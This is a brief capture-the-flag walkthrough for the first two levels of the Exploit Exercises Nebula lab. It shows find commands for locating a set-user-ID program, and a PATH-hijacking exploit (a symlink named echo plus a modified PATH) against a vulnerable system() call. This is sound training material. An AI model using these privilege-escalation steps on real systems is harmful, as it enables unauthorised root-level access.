EXPLOIT EXERCISES - NEBULA

Level 00 - You are required to find a Set User ID program that will run as "flag00"
There are a few variations of using the find command which id needed to complete the challenge such as

level00@nebula:~$ find / -perm /u=s -user flag00 2>/dev/null 
or
level00@nebula:~$ find / -user flag00 -type f -executable 2>/dev/null/bin/.../flag00

After each run

/bin/.../flag00

followed by

getflag 

which will complete the level



Level 01 - This involves a C program which is vulnerable, the vulnerability allows for arbitrary programs
to execute. The program itself calls 'echo' and then the text 'and now what?' is sent to the screen. The 
vulnerability lies in the fact that the echo is called using the environment settings like this -

system("/usr/bin/env echo and now what?");

************************************************************************************************************
Important - The /usr/bin/env is often used by scripts that need full paths eg 
#!/usr/bin/env python is used by python scripts to get a full path to the python interpreter.
************************************************************************************************************

This means that the path needs to be modified in order to be exploited. Again there are a few ways of 
doing this but the easiest is to create a symbolic link as symbolic links can be used for bypassing name and 
location checks

level01@nebula:~$ ln -s /bin/getflag echo

level01@nebula:~$ export PATH=.:$PATH

Then run

level01@nebula:~$ /home/flag01/flag01 

and you should see the success message
